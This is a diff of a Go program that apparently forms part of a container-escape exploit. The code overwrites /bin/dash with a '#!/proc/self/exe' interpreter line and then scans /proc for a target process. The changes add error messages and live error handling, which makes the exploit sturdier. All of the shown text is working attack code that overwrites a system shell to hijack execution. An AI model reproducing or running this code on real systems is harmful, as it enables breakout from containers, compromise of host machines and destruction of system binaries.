@@ -19,12 +19,14 @@ func main() {
 	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
 	fd, err := os.Create("/bin/dash")
 	if err != nil {
-		// fmt.Println(err)
-		// return
+		fmt.Println("[!!] Fail to open /bin/dash!")
+		fmt.Println(err)
+		return
 	}
 	fmt.Fprintln(fd, "#!/proc/self/exe")
 	err = fd.Close()
 	if err != nil {
+		fmt.Println("[!!] Fail to write /bin/dash!")
 		fmt.Println(err)
 		return
 	}
@@ -36,6 +38,7 @@ func main() {
 	for found == 0 {
 		pids, err := ioutil.ReadDir("/proc")
 		if err != nil {
+			fmt.Println("[!!] Fail to read /proc")
 			fmt.Println(err)
 			return
 		}
